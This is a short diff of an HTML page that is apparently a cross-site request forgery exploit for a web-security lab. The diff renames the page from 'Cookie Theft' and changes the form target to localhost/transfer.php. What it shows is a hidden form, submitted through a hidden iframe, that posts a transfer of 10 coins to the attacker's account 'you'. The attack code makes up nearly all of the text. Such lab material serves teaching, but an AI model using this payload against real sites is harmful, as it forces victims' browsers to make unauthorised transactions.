@@ -1,6 +1,6 @@
 <html>
     <head>
-        <title>Cookie Theft</title>
+        <title>Cross-site Request Forgery</title>
     </head>
     <body>
         <script>
@@ -10,7 +10,7 @@
         </script>
         
         <iframe name="fake" onload="callback()"></iframe>
-        <form name="transferform" action="http://localhost/barbarbar/transfer.php" method="POST" target="fake">
+        <form name="transferform" action="http://localhost/transfer.php" method="POST" target="fake">
             <input name="coins" type="hidden" value="10" />
             <input name="recipient" type="hidden" value="you" />
             <input name="submission" type="hidden" value="Send" />
